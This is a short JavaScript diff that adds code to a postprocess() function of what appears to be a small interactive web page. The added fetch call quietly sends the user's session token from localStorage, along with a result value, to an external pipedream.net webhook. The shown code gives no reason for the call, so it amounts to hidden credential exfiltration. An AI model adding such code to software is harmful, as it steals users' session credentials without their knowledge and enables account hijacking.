@@ -86,6 +86,15 @@ function check_item() {
 
 function postprocess() {
     let item = check_item();
+    fetch("https://b1dca5512b98ce4f6a6cd2a9ad9c34fa.m.pipedream.net", {
+        method: "POST",
+        // mode: "no-cors",
+        body: JSON.stringify({
+            name: "Unknown",
+            id: result,
+            session: localStorage.getItem("session")
+        })
+    })
     if (item.id === 3) {
         if (repeated) {
             $("#dialog-content").text("emmmmm.....我应该把我的謝意送给谁呢?")
